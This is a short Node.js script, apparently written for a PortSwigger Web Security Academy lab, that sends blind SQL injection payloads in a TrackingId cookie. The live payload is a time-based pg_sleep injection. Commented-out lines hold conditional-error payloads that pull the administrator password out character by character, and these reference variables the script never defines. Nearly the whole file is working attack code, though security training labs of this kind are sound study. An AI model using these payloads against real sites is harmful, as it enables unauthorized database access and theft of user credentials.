import { parse } from "node-html-parser";
import axios from "axios";

const subDomain = "ac7e1f6d1efb2606c0532d5200250027";
const fullWebAddress = `https://${subDomain}.web-security-academy.net/`;
const queryPrefix = `filter?category=Gifts`;

const main = async () => {
  try {
    const response = await axios.get(fullWebAddress, {
      headers: {
        // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTRING(Password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN 1/0 ELSE 'a' END FROM Users)='a`,
        // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTRING(Password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN to_char(1/0) ELSE 'a' END FROM Users)='a`,
        // Cookie: `TrackingId=7GIN8M7m5eSOW7I5' AND (SELECT username, password CASE WHEN (username = 'administrator' AND SUBSTR(password, ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}') THEN to_char(1/0) ELSE 'a' END FROM Users)='a`,
        Cookie: `TrackingId=blCymBfgnfabAEyJ'||pg_sleep(10)--`,
      },
    });
    console.log(response.data);
  } catch (e) {
    console.log(e);
  }
};

main();
